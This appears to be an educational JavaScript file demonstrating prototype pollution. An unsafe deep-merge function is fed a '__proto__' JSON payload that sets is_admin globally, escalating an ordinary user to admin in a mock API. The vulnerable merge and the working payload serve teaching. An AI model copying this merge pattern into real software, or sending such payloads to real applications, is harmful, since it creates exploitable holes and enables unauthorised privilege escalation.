// Example of unsafe merge in JavaScript, resulting in global prototype pollution

function validateSession(token){
    // Comically fake session validation. 
    // Returns fake user ID for use in fake database. 
    if(token == "session=validID")
        return 1
    return false
}

function dbGetUser(userID){
    // Fake database that fetches user from ID
    let db=[
        {username: 'user1', phoneNumber: '111-111-1111', id: 1},
        {username: 'user2', phoneNumber: '222-222-2222', id: 2},
        {username: 'megaAdmin', phoneNumber: '999-999-9999', id: 0, is_admin: true}
    ]
    return db[userID-1];
}

function dbWriteUser(userOriginal, userUpdated){
    // Since the database is mock, we will simply leave the write
    // action as a stub. 
    return true;
}

function isObject(obj){
    return obj && obj.constructor && obj.constructor === Object;
}

// Recursive (AKA Deep) Merge - UNSAFE 
function merge(source, destination){
    Object.entries(source).forEach(([key, value]) => {
        // Check if destination has subobject
        if(isObject(source[key]) && isObject(destination[key])){
            // Recursion
            merge(source[key], destination[key])
        }
        else{
        // Otherwise copy the value into destination and continue
        destination[key] = value;
        }
    })
}

function handleAPI(request){
    // Example API handler
    if(request.url == "/users"){
        // Action requires authentication, validate session
        let userID = validateSession(request.headers.Cookie);
        if (!userID) return "400 Bad Request";

        // Merge with vulnerable function
        let userSettings = {}
        merge(JSON.parse(request.body), userSettings);

        // Input validation simply checking that the properties exist
        if(!userSettings["username"] || !userSettings["phoneNumber"] || !userSettings["favoritePizza"])
            return "400 Bad Request";
        
        let user = dbGetUser(userID);
        // Just for this example, we print whether the user object has
        // the is_admin property, which may allow the account to perform
        // privileged actions in some applications. 
        if(user.is_admin)
            console.log(`User '${user.username}' is admin.`);
        // Note that an attacker's request causes this property to be populated,
        // even though the is_admin property was only ever written to the 
        // request object (not the user object).
        dbWriteUser(user, userSettings);
        return "200 OK";
    }
}

// Executes the mock request
function simulateUserRequest(){
    // Example baseline requset
    request1 = {
        url: "/users",
        method: "POST",
        headers: {
            Host: 'vulnerable-site.notreal',
            Cookie: 'session=validID',
            Content_Type: 'application/json',
            Content_Length: '1337'
        },
        body: '{"username": "bhis-isaac", "phoneNumber": "098-765-4321", "favoritePizza": "supreme"}'
    };
    console.log(handleAPI(request1));

    // Request from attacker
    request2 = {
        url: "/users",
        method: "POST",
        headers: {
            Host: 'vulnerable-site.notreal',
            Cookie: 'session=validID',
            Content_Type: 'application/json',
            Content_Length: '1337'
        },
        body: '{"__proto__": {"username": "bhis-isaac", "phoneNumber": "123-456-7890", "favoritePizza": "anchovies", "is_admin": true}}'
    };
    console.log(handleAPI(request2));
};

simulateUserRequest();